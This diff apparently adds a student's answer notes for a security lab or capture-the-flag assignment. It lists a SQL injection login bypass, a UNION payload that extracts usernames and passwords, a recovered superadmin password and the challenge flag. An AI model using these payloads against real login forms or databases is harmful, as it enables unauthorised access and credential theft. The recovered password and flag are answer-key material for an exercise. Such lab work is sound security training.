@@ -1,0 +1,16 @@
+ASSIGN 4
+
+
+SQL injection login
+input: admin' OR '1'='1
+
+
+SQL injection UNION attack
+
+input: ' UNION SELECT NULL,username,password FROM users WHERE  '1'='1
+
+
+superadmin password: sup3r4dm1nP@5sw0rd
+
+
+FLAG: TUC{SQLi_1s_4w3s0m3_NGL_4nd_th3_sky_1s_blu3}
